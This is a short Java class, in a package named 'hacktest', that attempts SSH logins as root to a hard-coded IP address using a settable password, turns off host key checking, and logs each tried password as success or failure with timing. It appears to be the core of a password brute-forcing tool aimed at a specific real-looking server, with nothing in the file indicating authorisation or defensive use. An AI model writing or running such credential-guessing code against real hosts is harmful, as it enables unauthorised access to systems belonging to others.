package cn.wfy.hacktest;

import cn.wfy.util.LogManager;
import cn.wfy.util.LogUtil;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;


public class SSHConnet {
    private static final LogUtil LOGGER = LogManager.getLogger();

    public String password;

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }


    public void getConnet() {
        long a = System.currentTimeMillis();
        String user = "root";
        String host = "83.223.21.6";

        Integer port = 22;

        JSch jsch = new JSch();
        Session session = null;
        try {
            session = jsch.getSession(user, host, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            // step1：建立ssh连接
            session.connect(1000);
            System.out.println(session.getServerVersion());//这里打印SSH服务器版本信息
            long b = System.currentTimeMillis();
            LOGGER.info(password + "--succ    " + (b - a) + "ms");
            session.disconnect();
        } catch (Exception e) {
            if (null != session) {
                //关闭ssh连接
                session.disconnect();
            }
            long b = System.currentTimeMillis();
            LOGGER.info(password + "--fail   " + (b - a) + "ms");
        }

    }


}
